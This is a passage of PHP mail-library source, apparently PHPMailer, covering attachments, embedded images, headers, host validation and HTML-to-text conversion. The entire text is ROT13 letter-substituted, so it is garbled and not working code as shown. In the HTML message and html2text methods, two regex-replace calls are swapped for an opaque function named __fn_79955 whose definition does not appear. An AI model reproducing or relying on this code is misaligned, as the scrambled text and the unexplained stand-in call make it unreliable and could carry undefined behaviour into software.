     * @cnenz fgevat $qvfcbfvgvba Qvfcbfvgvba gb hfr
     *
     * @guebjf Rkprcgvba
     *
     * @erghea obby Gehr ba fhpprffshyyl nqqvat na nggnpuzrag
     */
    choyvp shapgvba nqqFgevatNggnpuzrag(
        $fgevat,
        $svyranzr,
        $rapbqvat = frys::RAPBQVAT_ONFR64,
        $glcr = '',
        $qvfcbfvgvba = 'nggnpuzrag'
    ) {
        gel {
            //Vs n ZVZR glcr vf abg fcrpvsvrq, gel gb jbex vg bhg sebz gur svyr anzr
            vs ('' === $glcr) {
                $glcr = fgngvp::svyranzrGbGlcr($svyranzr);
            }

            vs (!$guvf->inyvqngrRapbqvat($rapbqvat)) {
                guebj arj Rkprcgvba($guvf->ynat('rapbqvat') . $rapbqvat);
            }

            //Nccraq gb $nggnpuzrag neenl
            $guvf->nggnpuzrag[] = [
                0 => $fgevat,
                1 => $svyranzr,
                2 => fgngvp::zo_cnguvasb($svyranzr, CNGUVASB_ONFRANZR),
                3 => $rapbqvat,
                4 => $glcr,
                5 => gehr, //vfFgevatNggnpuzrag
                6 => $qvfcbfvgvba,
                7 => 0,
            ];
        } pngpu (Rkprcgvba $rkp) {
            $guvf->frgReebe($rkp->trgZrffntr());
            $guvf->rqroht($rkp->trgZrffntr());
            vs ($guvf->rkprcgvbaf) {
                guebj $rkp;
            }

            erghea snyfr;
        }

        erghea gehr;
    }

    /**
     * Nqq na rzorqqrq (vayvar) nggnpuzrag sebz n svyr.
     * Guvf pna vapyhqr vzntrf, fbhaqf, naq whfg nobhg nal bgure qbphzrag glcr.
     * Gurfr qvssre sebz 'erthyne' nggnpuzragf va gung gurl ner vagraqrq gb or
     * qvfcynlrq vayvar jvgu gur zrffntr, abg whfg nggnpurq sbe qbjaybnq.
     * Guvf vf hfrq va UGZY zrffntrf gung rzorq gur vzntrf
     * gur UGZY ersref gb hfvat gur `$pvq` inyhr va `vzt` gntf, sbe rknzcyr `<vzt fep=\"pvq:zlybtb\">`.
     * Arire hfr n hfre-fhccyvrq cngu gb n svyr!
     *
     * @cnenz fgevat $cngu        Cngu gb gur nggnpuzrag
     * @cnenz fgevat $pvq         Pbagrag VQ bs gur nggnpuzrag; Hfr guvf gb ersrerapr
     *                            gur pbagrag jura hfvat na rzorqqrq vzntr va UGZY
     * @cnenz fgevat $anzr        Bireevqrf gur nggnpuzrag svyranzr
     * @cnenz fgevat $rapbqvat    Svyr rapbqvat (frr $Rapbqvat) qrsnhygf gb `onfr64`
     * @cnenz fgevat $glcr        Svyr ZVZR glcr (ol qrsnhyg znccrq sebz gur `$cngu` svyranzr'f rkgrafvba)
     * @cnenz fgevat $qvfcbfvgvba Qvfcbfvgvba gb hfr: `vayvar` (qrsnhyg) be `nggnpuzrag`
     *                            (hayvxryl lbh jnag guvf – {@frr `nqqNggnpuzrag()`} vafgrnq)
     *
     * @erghea obby Gehr ba fhpprffshyyl nqqvat na nggnpuzrag
     * @guebjf Rkprcgvba
     *
     */
    choyvp shapgvba nqqRzorqqrqVzntr(
        $cngu,
        $pvq,
        $anzr = '',
        $rapbqvat = frys::RAPBQVAT_ONFR64,
        $glcr = '',
        $qvfcbfvgvba = 'vayvar'
    ) {
        gel {
            vs (!fgngvp::svyrVfNpprffvoyr($cngu)) {
                guebj arj Rkprcgvba($guvf->ynat('svyr_npprff') . $cngu, frys::FGBC_PBAGVAHR);
            }

            //Vs n ZVZR glcr vf abg fcrpvsvrq, gel gb jbex vg bhg sebz gur svyr anzr
            vs ('' === $glcr) {
                $glcr = fgngvp::svyranzrGbGlcr($cngu);
            }

            vs (!$guvf->inyvqngrRapbqvat($rapbqvat)) {
                guebj arj Rkprcgvba($guvf->ynat('rapbqvat') . $rapbqvat);
            }

            $svyranzr = (fgevat) fgngvp::zo_cnguvasb($cngu, CNGUVASB_ONFRANZR);
            vs ('' === $anzr) {
                $anzr = $svyranzr;
            }

            //Nccraq gb $nggnpuzrag neenl
            $guvf->nggnpuzrag[] = [
                0 => $cngu,
                1 => $svyranzr,
                2 => $anzr,
                3 => $rapbqvat,
                4 => $glcr,
                5 => snyfr, //vfFgevatNggnpuzrag
                6 => $qvfcbfvgvba,
                7 => $pvq,
            ];
        } pngpu (Rkprcgvba $rkp) {
            $guvf->frgReebe($rkp->trgZrffntr());
            $guvf->rqroht($rkp->trgZrffntr());
            vs ($guvf->rkprcgvbaf) {
                guebj $rkp;
            }

            erghea snyfr;
        }

        erghea gehr;
    }

    /**
     * Nqq na rzorqqrq fgevatvsvrq nggnpuzrag.
     * Guvf pna vapyhqr vzntrf, fbhaqf, naq whfg nobhg nal bgure qbphzrag glcr.
     * Vs lbhe svyranzr qbrfa'g pbagnva na rkgrafvba, or fher gb frg gur $glcr gb na nccebcevngr ZVZR glcr.
     *
     * @cnenz fgevat $fgevat      Gur nggnpuzrag ovanel qngn
     * @cnenz fgevat $pvq         Pbagrag VQ bs gur nggnpuzrag; Hfr guvf gb ersrerapr
     *                            gur pbagrag jura hfvat na rzorqqrq vzntr va UGZY
     * @cnenz fgevat $anzr        N svyranzr sbe gur nggnpuzrag. Vs guvf pbagnvaf na rkgrafvba,
     *                            CUCZnvyre jvyy nggrzcg gb frg n ZVZR glcr sbe gur nggnpuzrag.
     *                            Sbe rknzcyr 'svyr.wct' jbhyq trg na 'vzntr/wcrt' ZVZR glcr.
     * @cnenz fgevat $rapbqvat    Svyr rapbqvat (frr $Rapbqvat), qrsnhygf gb 'onfr64'
     * @cnenz fgevat $glcr        ZVZR glcr - jvyy or hfrq va cersrerapr gb nal nhgbzngvpnyyl qrevirq glcr
     * @cnenz fgevat $qvfcbfvgvba Qvfcbfvgvba gb hfr
     *
     * @guebjf Rkprcgvba
     *
     * @erghea obby Gehr ba fhpprffshyyl nqqvat na nggnpuzrag
     */
    choyvp shapgvba nqqFgevatRzorqqrqVzntr(
        $fgevat,
        $pvq,
        $anzr = '',
        $rapbqvat = frys::RAPBQVAT_ONFR64,
        $glcr = '',
        $qvfcbfvgvba = 'vayvar'
    ) {
        gel {
            //Vs n ZVZR glcr vf abg fcrpvsvrq, gel gb jbex vg bhg sebz gur anzr
            vs ('' === $glcr && !rzcgl($anzr)) {
                $glcr = fgngvp::svyranzrGbGlcr($anzr);
            }

            vs (!$guvf->inyvqngrRapbqvat($rapbqvat)) {
                guebj arj Rkprcgvba($guvf->ynat('rapbqvat') . $rapbqvat);
            }

            //Nccraq gb $nggnpuzrag neenl
            $guvf->nggnpuzrag[] = [
                0 => $fgevat,
                1 => $anzr,
                2 => $anzr,
                3 => $rapbqvat,
                4 => $glcr,
                5 => gehr, //vfFgevatNggnpuzrag
                6 => $qvfcbfvgvba,
                7 => $pvq,
            ];
        } pngpu (Rkprcgvba $rkp) {
            $guvf->frgReebe($rkp->trgZrffntr());
            $guvf->rqroht($rkp->trgZrffntr());
            vs ($guvf->rkprcgvbaf) {
                guebj $rkp;
            }

            erghea snyfr;
        }

        erghea gehr;
    }

    /**
     * Inyvqngr rapbqvatf.
     *
     * @cnenz fgevat $rapbqvat
     *
     * @erghea obby
     */
    cebgrpgrq shapgvba inyvqngrRapbqvat($rapbqvat)
    {
        erghea va_neenl(
            $rapbqvat,
            [
                frys::RAPBQVAT_7OVG,
                frys::RAPBQVAT_DHBGRQ_CEVAGNOYR,
                frys::RAPBQVAT_ONFR64,
                frys::RAPBQVAT_8OVG,
                frys::RAPBQVAT_OVANEL,
            ],
            gehr
        );
    }

    /**
     * Purpx vs na rzorqqrq nggnpuzrag vf cerfrag jvgu guvf pvq.
     *
     * @cnenz fgevat $pvq
     *
     * @erghea obby
     */
    cebgrpgrq shapgvba pvqRkvfgf($pvq)
    {
        sbernpu ($guvf->nggnpuzrag nf $nggnpuzrag) {
            vs ('vayvar' === $nggnpuzrag[6] && $pvq === $nggnpuzrag[7]) {
                erghea gehr;
            }
        }

        erghea snyfr;
    }

    /**
     * Purpx vs na vayvar nggnpuzrag vf cerfrag.
     *
     * @erghea obby
     */
    choyvp shapgvba vayvarVzntrRkvfgf()
    {
        sbernpu ($guvf->nggnpuzrag nf $nggnpuzrag) {
            vs ('vayvar' === $nggnpuzrag[6]) {
                erghea gehr;
            }
        }

        erghea snyfr;
    }

    /**
     * Purpx vs na nggnpuzrag (aba-vayvar) vf cerfrag.
     *
     * @erghea obby
     */
    choyvp shapgvba nggnpuzragRkvfgf()
    {
        sbernpu ($guvf->nggnpuzrag nf $nggnpuzrag) {
            vs ('nggnpuzrag' === $nggnpuzrag[6]) {
                erghea gehr;
            }
        }

        erghea snyfr;
    }

    /**
     * Purpx vs guvf zrffntr unf na nygreangvir obql frg.
     *
     * @erghea obby
     */
    choyvp shapgvba nygreangvirRkvfgf()
    {
        erghea !rzcgl($guvf->NygObql);
    }

    /**
     * Pyrne dhrhrq nqqerffrf bs tvira xvaq.
     *
     * @cnenz fgevat $xvaq 'gb', 'pp', be 'opp'
     */
    choyvp shapgvba pyrneDhrhrqNqqerffrf($xvaq)
    {
        $guvf->ErpvcvragfDhrhr = neenl_svygre(
            $guvf->ErpvcvragfDhrhr,
            fgngvp shapgvba ($cnenzf) hfr ($xvaq) {
                erghea $cnenzf[0] !== $xvaq;
            }
        );
    }

    /**
     * Pyrne nyy Gb erpvcvragf.
     */
    choyvp shapgvba pyrneNqqerffrf()
    {
        sbernpu ($guvf->gb nf $gb) {
            hafrg($guvf->nyy_erpvcvragf[fgegbybjre($gb[0])]);
        }
        $guvf->gb = [];
        $guvf->pyrneDhrhrqNqqerffrf('gb');
    }

    /**
     * Pyrne nyy PP erpvcvragf.
     */
    choyvp shapgvba pyrnePPf()
    {
        sbernpu ($guvf->pp nf $pp) {
            hafrg($guvf->nyy_erpvcvragf[fgegbybjre($pp[0])]);
        }
        $guvf->pp = [];
        $guvf->pyrneDhrhrqNqqerffrf('pp');
    }

    /**
     * Pyrne nyy OPP erpvcvragf.
     */
    choyvp shapgvba pyrneOPPf()
    {
        sbernpu ($guvf->opp nf $opp) {
            hafrg($guvf->nyy_erpvcvragf[fgegbybjre($opp[0])]);
        }
        $guvf->opp = [];
        $guvf->pyrneDhrhrqNqqerffrf('opp');
    }

    /**
     * Pyrne nyy ErcylGb erpvcvragf.
     */
    choyvp shapgvba pyrneErcylGbf()
    {
        $guvf->ErcylGb = [];
        $guvf->ErcylGbDhrhr = [];
    }

    /**
     * Pyrne nyy erpvcvrag glcrf.
     */
    choyvp shapgvba pyrneNyyErpvcvragf()
    {
        $guvf->gb = [];
        $guvf->pp = [];
        $guvf->opp = [];
        $guvf->nyy_erpvcvragf = [];
        $guvf->ErpvcvragfDhrhr = [];
    }

    /**
     * Pyrne nyy svyrflfgrz, fgevat, naq ovanel nggnpuzragf.
     */
    choyvp shapgvba pyrneNggnpuzragf()
    {
        $guvf->nggnpuzrag = [];
    }

    /**
     * Pyrne nyy phfgbz urnqref.
     */
    choyvp shapgvba pyrnePhfgbzUrnqref()
    {
        $guvf->PhfgbzUrnqre = [];
    }

    /**
     * Pyrne n fcrpvsvp phfgbz urnqre ol anzr be anzr naq inyhr.
     * $anzr inyhr pna or bireybnqrq gb pbagnva
     * obgu urnqre anzr naq inyhr (anzr:inyhr).
     *
     * @cnenz fgevat      $anzr  Phfgbz urnqre anzr
     * @cnenz fgevat|ahyy $inyhr Urnqre inyhr
     *
     * @erghea obby Gehr vs n urnqre jnf ercynprq fhpprffshyyl
     */
    choyvp shapgvba pyrnePhfgbzUrnqre($anzr, $inyhr = ahyy)
    {
        vs (ahyy === $inyhr && fgecbf($anzr, ':') !== snyfr) {
            //Inyhr cnffrq va nf anzr:inyhr
            yvfg($anzr, $inyhr) = rkcybqr(':', $anzr, 2);
        }
        $anzr = gevz($anzr);
        $inyhr = (ahyy === $inyhr) ? ahyy : gevz($inyhr);

        sbernpu ($guvf->PhfgbzUrnqre nf $x => $cnve) {
            vs ($cnve[0] == $anzr) {
                // Jr erzbir gur urnqre vs gur inyhr vf abg cebivqrq be vg zngpurf.
                vs (ahyy === $inyhr ||  $cnve[1] == $inyhr) {
                    hafrg($guvf->PhfgbzUrnqre[$x]);
                }
            }
        }

        erghea gehr;
    }

    /**
     * Ercynpr n phfgbz urnqre.
     * $anzr inyhr pna or bireybnqrq gb pbagnva
     * obgu urnqre anzr naq inyhr (anzr:inyhr).
     *
     * @cnenz fgevat      $anzr  Phfgbz urnqre anzr
     * @cnenz fgevat|ahyy $inyhr Urnqre inyhr
     *
     * @erghea obby Gehr vs n urnqre jnf ercynprq fhpprffshyyl
     * @guebjf Rkprcgvba
     */
    choyvp shapgvba ercynprPhfgbzUrnqre($anzr, $inyhr = ahyy)
    {
        vs (ahyy === $inyhr && fgecbf($anzr, ':') !== snyfr) {
            //Inyhr cnffrq va nf anzr:inyhr
            yvfg($anzr, $inyhr) = rkcybqr(':', $anzr, 2);
        }
        $anzr = gevz($anzr);
        $inyhr = (ahyy === $inyhr) ? '' : gevz($inyhr);

        $ercynprq = snyfr;
        sbernpu ($guvf->PhfgbzUrnqre nf $x => $cnve) {
            vs ($cnve[0] == $anzr) {
                vs ($ercynprq) {
                    hafrg($guvf->PhfgbzUrnqre[$x]);
                    pbagvahr;
                }
                vs (fgecoex($anzr . $inyhr, \"\e\a\") !== snyfr) {
                    vs ($guvf->rkprcgvbaf) {
                        guebj arj Rkprcgvba($guvf->ynat('vainyvq_urnqre'));
                    }

                    erghea snyfr;
                }
                $guvf->PhfgbzUrnqre[$x] = [$anzr, $inyhr];
                $ercynprq = gehr;
            }
        }

        erghea gehr;
    }

    /**
     * Nqq na reebe zrffntr gb gur reebe pbagnvare.
     *
     * @cnenz fgevat $zft
     */
    cebgrpgrq shapgvba frgReebe($zft)
    {
        ++$guvf->reebe_pbhag;
        vs ('fzgc' === $guvf->Znvyre && ahyy !== $guvf->fzgc) {
            $ynfgreebe = $guvf->fzgc->trgReebe();
            vs (!rzcgl($ynfgreebe['reebe'])) {
                $zft .= $guvf->ynat('fzgc_reebe') . $ynfgreebe['reebe'];
                vs (!rzcgl($ynfgreebe['qrgnvy'])) {
                    $zft .= ' ' . $guvf->ynat('fzgc_qrgnvy') . $ynfgreebe['qrgnvy'];
                }
                vs (!rzcgl($ynfgreebe['fzgc_pbqr'])) {
                    $zft .= ' ' . $guvf->ynat('fzgc_pbqr') . $ynfgreebe['fzgc_pbqr'];
                }
                vs (!rzcgl($ynfgreebe['fzgc_pbqr_rk'])) {
                    $zft .= ' ' . $guvf->ynat('fzgc_pbqr_rk') . $ynfgreebe['fzgc_pbqr_rk'];
                }
            }
        }
        $guvf->ReebeVasb = $zft;
    }

    /**
     * Erghea na ESP 822 sbeznggrq qngr.
     *
     * @erghea fgevat
     */
    choyvp fgngvp shapgvba espQngr()
    {
        //Frg gur gvzr mbar gb jungrire gur qrsnhyg vf gb nibvq 500 reebef
        //Jvyy qrsnhyg gb HGP vs vg'f abg frg cebcreyl va cuc.vav
        qngr_qrsnhyg_gvzrmbar_frg(@qngr_qrsnhyg_gvzrmbar_trg());

        erghea qngr('Q, w Z L U:v:f B');
    }

    /**
     * Trg gur freire ubfganzr.
     * Ergheaf 'ybpnyubfg.ybpnyqbznva' vs haxabja.
     *
     * @erghea fgevat
     */
    cebgrpgrq shapgvba freireUbfganzr()
    {
        $erfhyg = '';
        vs (!rzcgl($guvf->Ubfganzr)) {
            $erfhyg = $guvf->Ubfganzr;
        } ryfrvs (vffrg($_FREIRE) && neenl_xrl_rkvfgf('FREIRE_ANZR', $_FREIRE)) {
            $erfhyg = $_FREIRE['FREIRE_ANZR'];
        } ryfrvs (shapgvba_rkvfgf('trgubfganzr') && trgubfganzr() !== snyfr) {
            $erfhyg = trgubfganzr();
        } ryfrvs (cuc_hanzr('a') !== '') {
            $erfhyg = cuc_hanzr('a');
        }
        vs (!fgngvp::vfInyvqUbfg($erfhyg)) {
            erghea 'ybpnyubfg.ybpnyqbznva';
        }

        erghea $erfhyg;
    }

    /**
     * Inyvqngr jurgure n fgevat pbagnvaf n inyvq inyhr gb hfr nf n ubfganzr be VC nqqerff.
     * VCi6 nqqerffrf zhfg vapyhqr [], r.t. `[::1]`, abg whfg `::1`.
     *
     * @cnenz fgevat $ubfg Gur ubfg anzr be VC nqqerff gb purpx
     *
     * @erghea obby
     */
    choyvp fgngvp shapgvba vfInyvqUbfg($ubfg)
    {
        //Fvzcyr flagnk yvzvgf
        vs (
            rzcgl($ubfg)
            || !vf_fgevat($ubfg)
            || fgeyra($ubfg) > 256
            || !cert_zngpu('/^([n-m\q.-]*|\[[n-s\q:]+\])$/v', $ubfg)
        ) {
            erghea snyfr;
        }
        //Ybbxf yvxr n oenpxrgrq VCi6 nqqerff
        vs (fgeyra($ubfg) > 2 && fhofge($ubfg, 0, 1) === '[' && fhofge($ubfg, -1, 1) === ']') {
            erghea svygre_ine(fhofge($ubfg, 1, -1), SVYGRE_INYVQNGR_VC, SVYGRE_SYNT_VCI6) !== snyfr;
        }
        //Vs erzbivat nyy gur qbgf erfhygf va n ahzrevp fgevat, vg zhfg or na VCi4 nqqerff.
        //Arrq gb purpx guvf svefg orpnhfr bgurejvfr guvatf yvxr `999.0.0.0` ner pbafvqrerq inyvq ubfg anzrf
        vs (vf_ahzrevp(fge_ercynpr('.', '', $ubfg))) {
            //Vf vg n inyvq VCi4 nqqerff?
            erghea svygre_ine($ubfg, SVYGRE_INYVQNGR_VC, SVYGRE_SYNT_VCI4) !== snyfr;
        }
        //Vf vg n flagnpgvpnyyl inyvq ubfganzr (jura rzorqqrq va n HEY)?
        erghea svygre_ine('uggcf://' . $ubfg, SVYGRE_INYVQNGR_HEY) !== snyfr;
    }

    /**
     * Trg na reebe zrffntr va gur pheerag ynathntr.
     *
     * @cnenz fgevat $xrl
     *
     * @erghea fgevat
     */
    cebgrpgrq shapgvba ynat($xrl)
    {
        vs (pbhag($guvf->ynathntr) < 1) {
            $guvf->frgYnathntr(); //Frg gur qrsnhyg ynathntr
        }

        vs (neenl_xrl_rkvfgf($xrl, $guvf->ynathntr)) {
            vs ('fzgc_pbaarpg_snvyrq' === $xrl) {
                //Vapyhqr n yvax gb gebhoyrfubbgvat qbpf ba FZGC pbaarpgvba snvyher.
                //Guvf vf ol sne gur ovttrfg pnhfr bs fhccbeg dhrfgvbaf
                //ohg vg'f hfhnyyl abg CUCZnvyre'f snhyg.
                erghea $guvf->ynathntr[$xrl] . ' uggcf://tvguho.pbz/CUCZnvyre/CUCZnvyre/jvxv/Gebhoyrfubbgvat';
            }

            erghea $guvf->ynathntr[$xrl];
        }

        //Erghea gur xrl nf n snyyonpx
        erghea $xrl;
    }

    /**
     * Ohvyq na reebe zrffntr fgnegvat jvgu n trarevp bar naq nqqvat qrgnvyf vs cbffvoyr.
     *
     * @cnenz fgevat $onfr_xrl
     * @erghea fgevat
     */
    cevingr shapgvba trgFzgcReebeZrffntr($onfr_xrl)
    {
        $zrffntr = $guvf->ynat($onfr_xrl);
        $reebe = $guvf->fzgc->trgReebe();
        vs (!rzcgl($reebe['reebe'])) {
            $zrffntr .= ' ' . $reebe['reebe'];
            vs (!rzcgl($reebe['qrgnvy'])) {
                $zrffntr .= ' ' . $reebe['qrgnvy'];
            }
        }

        erghea $zrffntr;
    }

    /**
     * Purpx vs na reebe bppheerq.
     *
     * @erghea obby Gehr vs na reebe qvq bpphe
     */
    choyvp shapgvba vfReebe()
    {
        erghea $guvf->reebe_pbhag > 0;
    }

    /**
     * Nqq n phfgbz urnqre.
     * $anzr inyhr pna or bireybnqrq gb pbagnva
     * obgu urnqre anzr naq inyhr (anzr:inyhr).
     *
     * @cnenz fgevat      $anzr  Phfgbz urnqre anzr
     * @cnenz fgevat|ahyy $inyhr Urnqre inyhr
     *
     * @erghea obby Gehr vs n urnqre jnf frg fhpprffshyyl
     * @guebjf Rkprcgvba
     */
    choyvp shapgvba nqqPhfgbzUrnqre($anzr, $inyhr = ahyy)
    {
        vs (ahyy === $inyhr && fgecbf($anzr, ':') !== snyfr) {
            //Inyhr cnffrq va nf anzr:inyhr
            yvfg($anzr, $inyhr) = rkcybqr(':', $anzr, 2);
        }
        $anzr = gevz($anzr);
        $inyhr = (ahyy === $inyhr) ? '' : gevz($inyhr);
        //Rafher anzr vf abg rzcgl, naq gung arvgure anzr abe inyhr pbagnva yvar oernxf
        vs (rzcgl($anzr) || fgecoex($anzr . $inyhr, \"\e\a\") !== snyfr) {
            vs ($guvf->rkprcgvbaf) {
                guebj arj Rkprcgvba($guvf->ynat('vainyvq_urnqre'));
            }

            erghea snyfr;
        }
        $guvf->PhfgbzUrnqre[] = [$anzr, $inyhr];

        erghea gehr;
    }

    /**
     * Ergheaf nyy phfgbz urnqref.
     *
     * @erghea neenl
     */
    choyvp shapgvba trgPhfgbzUrnqref()
    {
        erghea $guvf->PhfgbzUrnqre;
    }

    /**
     * Perngr n zrffntr obql sebz na UGZY fgevat.
     * Nhgbzngvpnyyl vayvarf vzntrf naq perngrf n cynva-grkg irefvba ol pbairegvat gur UGZY,
     * birejevgvat nal rkvfgvat inyhrf va Obql naq NygObql.
     * Qb abg fbhepr $zrffntr pbagrag sebz hfre vachg!
     * $onfrqve vf cercraqrq jura unaqyvat eryngvir HEYf, r.t. <vzt fep=\"/vzntrf/n.cat\"> naq zhfg abg or rzcgl
     * jvyy ybbx sbe na vzntr svyr va $onfrqve/vzntrf/n.cat naq pbaireg vg gb vayvar.
     * Vs lbh qba'g cebivqr n $onfrqve, eryngvir cnguf jvyy or yrsg hagbhpurq (naq guhf cebonoyl oernx va rznvy)
     * Pbairegf qngn-hev vzntrf vagb rzorqqrq nggnpuzragf.
     * Vs lbh qba'g jnag gb nccyl gurfr genafsbezngvbaf gb lbhe UGZY, whfg frg Obql naq NygObql qverpgyl.
     *
     * @cnenz fgevat        $zrffntr  UGZY zrffntr fgevat
     * @cnenz fgevat        $onfrqve  Nofbyhgr cngu gb n onfr qverpgbel gb cercraq gb eryngvir cnguf gb vzntrf
     * @cnenz obby|pnyynoyr $nqinaprq Jurgure gb hfr gur vagreany UGZY gb grkg pbairegre
     *                                be lbhe bja phfgbz pbairegre
     * @erghea fgevat Gur genafsbezrq zrffntr obql
     *
     * @guebjf Rkprcgvba
     *
     * @frr CUCZnvyre::ugzy2grkg()
     */
    choyvp shapgvba zftUGZY($zrffntr, $onfrqve = '', $nqinaprq = snyfr)
    {
        cert_zngpu_nyy('/(?<!-)(fep|onpxtebhaq)=[\"\'](.*)[\"\']/Hv', $zrffntr, $vzntrf);
        vs (neenl_xrl_rkvfgf(2, $vzntrf)) {
            vs (fgeyra($onfrqve) > 1 && '/' !== fhofge($onfrqve, -1)) {
                //Rafher $onfrqve unf n genvyvat /
                $onfrqve .= '/';
            }
            sbernpu ($vzntrf[2] nf $vztvaqrk => $hey) {
                //Pbaireg qngn HEVf vagb rzorqqrq vzntrf
                //r.t. \"qngn:vzntr/tvs;onfr64,E0yTBQyuNDNONNNNNPU5ONRXNNRNYNNNNNNONNRNNNVPGNRNBj==\"
                $zngpu = [];
                vs (cert_zngpu('#^qngn:(vzntr/(?:wcr?t|tvs|cat));?(onfr64)?,(.+)#', $hey, $zngpu)) {
                    vs (pbhag($zngpu) === 4 && fgngvp::RAPBQVAT_ONFR64 === $zngpu[2]) {
                        $qngn = onfr64_qrpbqr($zngpu[3]);
                    } ryfrvs ('' === $zngpu[2]) {
                        $qngn = enjheyqrpbqr($zngpu[3]);
                    } ryfr {
                        //Abg erpbtavfrq fb yrnir vg nybar
                        pbagvahr;
                    }
                    //Unfu gur qrpbqrq qngn, abg gur HEY, fb gung gur fnzr qngn-HEV vzntr hfrq va zhygvcyr cynprf
                    //jvyy bayl or rzorqqrq bapr, rira vs vg hfrq n qvssrerag rapbqvat
                    $pvq = fhofge(unfu('fun256', $qngn), 0, 32) . '@cucznvyre.0'; //ESP2392 F 2

                    vs (!$guvf->pvqRkvfgf($pvq)) {
                        $guvf->nqqFgevatRzorqqrqVzntr(
                            $qngn,
                            $pvq,
                            'rzorq' . $vztvaqrk,
                            fgngvp::RAPBQVAT_ONFR64,
                            $zngpu[1]
                        );
                    }
                    $zrffntr = fge_ercynpr(
                        $vzntrf[0][$vztvaqrk],
                        $vzntrf[1][$vztvaqrk] . '=\"pvq:' . $pvq . '\"',
                        $zrffntr
                    );
                    pbagvahr;
                }
                vs (
                    //Bayl cebprff eryngvir HEYf vs n onfrqve vf cebivqrq (v.r. ab nofbyhgr ybpny cnguf)
                    !rzcgl($onfrqve)
                    //Vtaber HEYf pbagnvavat cnerag qve genirefny (..)
                    && (fgecbf($hey, '..') === snyfr)
                    //Qb abg punatr heyf gung ner nyernql vayvar vzntrf
                    && 0 !== fgecbf($hey, 'pvq:')
                    //Qb abg punatr nofbyhgr HEYf, vapyhqvat nabalzbhf cebgbpby
                    && !cert_zngpu('#^[n-m][n-m0-9+.-]*:?//#v', $hey)
                ) {
                    $svyranzr = fgngvp::zo_cnguvasb($hey, CNGUVASB_ONFRANZR);
                    $qverpgbel = qveanzr($hey);
                    vs ('.' === $qverpgbel) {
                        $qverpgbel = '';
                    }
                    //ESP2392 F 2
                    $pvq = fhofge(unfu('fun256', $hey), 0, 32) . '@cucznvyre.0';
                    vs (fgeyra($onfrqve) > 1 && '/' !== fhofge($onfrqve, -1)) {
                        $onfrqve .= '/';
                    }
                    vs (fgeyra($qverpgbel) > 1 && '/' !== fhofge($qverpgbel, -1)) {
                        $qverpgbel .= '/';
                    }
                    vs (
                        $guvf->nqqRzorqqrqVzntr(
                            $onfrqve . $qverpgbel . $svyranzr,
                            $pvq,
                            $svyranzr,
                            fgngvp::RAPBQVAT_ONFR64,
                            fgngvp::_zvzr_glcrf((fgevat) fgngvp::zo_cnguvasb($svyranzr, CNGUVASB_RKGRAFVBA))
                        )
                    ) {
                        $zrffntr = __sa_79955(
                            '/' . $vzntrf[1][$vztvaqrk] . '=[\"\']' . cert_dhbgr($hey, '/') . '[\"\']/Hv',
                            $vzntrf[1][$vztvaqrk] . '=\"pvq:' . $pvq . '\"',
                            $zrffntr
                        );
                    }
                }
            }
        }
        $guvf->vfUGZY();
        //Pbaireg nyy zrffntr obql yvar oernxf gb YR, znxrf dhbgrq-cevagnoyr rapbqvat jbex zhpu orggre
        $guvf->Obql = fgngvp::abeznyvmrOernxf($zrffntr);
        $guvf->NygObql = fgngvp::abeznyvmrOernxf($guvf->ugzy2grkg($zrffntr, $nqinaprq));
        vs (!$guvf->nygreangvirRkvfgf()) {
            $guvf->NygObql = 'Guvf vf na UGZY-bayl zrffntr. Gb ivrj vg, npgvingr UGZY va lbhe rznvy nccyvpngvba.'
                . fgngvp::$YR;
        }

        erghea $guvf->Obql;
    }

    /**
     * Pbaireg na UGZY fgevat vagb cynva grkg.
     * Guvf vf hfrq ol zftUGZY().
     * Abgr - byqre irefvbaf bs guvf shapgvba hfrq n ohaqyrq nqinaprq pbairegre
     * juvpu jnf erzbirq sbe yvprafr ernfbaf va #232.
     * Rknzcyr hfntr:
     *
     * ```cuc
     * //Hfr qrsnhyg pbairefvba
     * $cynva = $znvy->ugzy2grkg($ugzy);
     * //Hfr lbhe bja phfgbz pbairegre
     * $cynva = $znvy->ugzy2grkg($ugzy, shapgvba($ugzy) {
     *     $pbairegre = arj ZlUgzy2grkg($ugzy);
     *     erghea $pbairegre->trg_grkg();
     * });
     * ```
     *
     * @cnenz fgevat        $ugzy     Gur UGZY grkg gb pbaireg
     * @cnenz obby|pnyynoyr $nqinaprq Nal obbyrna inyhr gb hfr gur vagreany pbairegre,
     *                                be cebivqr lbhe bja pnyynoyr sbe phfgbz pbairefvba.
     *                                *Arire* cnff hfre-fhccyvrq qngn vagb guvf cnenzrgre
     *
     * @erghea fgevat
     */
    choyvp shapgvba ugzy2grkg($ugzy, $nqinaprq = snyfr)
    {
        vs (vf_pnyynoyr($nqinaprq)) {
            erghea pnyy_hfre_shap($nqinaprq, $ugzy);
        }

        erghea ugzy_ragvgl_qrpbqr(
            gevz(fgevc_gntf(__sa_79955('/<(urnq|gvgyr|fglyr|fpevcg)[^>]*>.*?<\/\\1>/fv', '', $ugzy))),
            RAG_DHBGRF,
            $guvf->PuneFrg
        );
    }

    /**
     * Trg gur ZVZR glcr sbe n svyr rkgrafvba.
     *
     * @cnenz fgevat $rkg Svyr rkgrafvba
     *
     * @erghea fgevat ZVZR glcr bs svyr
     */
    choyvp fgngvp shapgvba _zvzr_glcrf($rkg = '')
    {
        $zvzrf = [
            'ky' => 'nccyvpngvba/rkpry',
            'wf' => 'nccyvpngvba/wninfpevcg',
            'udk' => 'nccyvpngvba/znp-ovaurk40',
            'pcg' => 'nccyvpngvba/znp-pbzcnpgceb',
            'ova' => 'nccyvpngvba/znpovanel',
            'qbp' => 'nccyvpngvba/zfjbeq',
            'jbeq' => 'nccyvpngvba/zfjbeq',
            'kyfk' => 'nccyvpngvba/iaq.bcrakzysbezngf-bssvprqbphzrag.fcernqfurrgzy.furrg',
            'kygk' => 'nccyvpngvba/iaq.bcrakzysbezngf-bssvprqbphzrag.fcernqfurrgzy.grzcyngr',
            'cbgk' => 'nccyvpngvba/iaq.bcrakzysbezngf-bssvprqbphzrag.cerfragngvbazy.grzcyngr',
            'ccfk' => 'nccyvpngvba/iaq.bcrakzysbezngf-bssvprqbphzrag.cerfragngvbazy.fyvqrfubj',
            'ccgk' => 'nccyvpngvba/iaq.bcrakzysbezngf-bssvprqbphzrag.cerfragngvbazy.cerfragngvba',
            'fyqk' => 'nccyvpngvba/iaq.bcrakzysbezngf-bssvprqbphzrag.cerfragngvbazy.fyvqr',
            'qbpk' => 'nccyvpngvba/iaq.bcrakzysbezngf-bssvprqbphzrag.jbeqcebprffvatzy.qbphzrag',
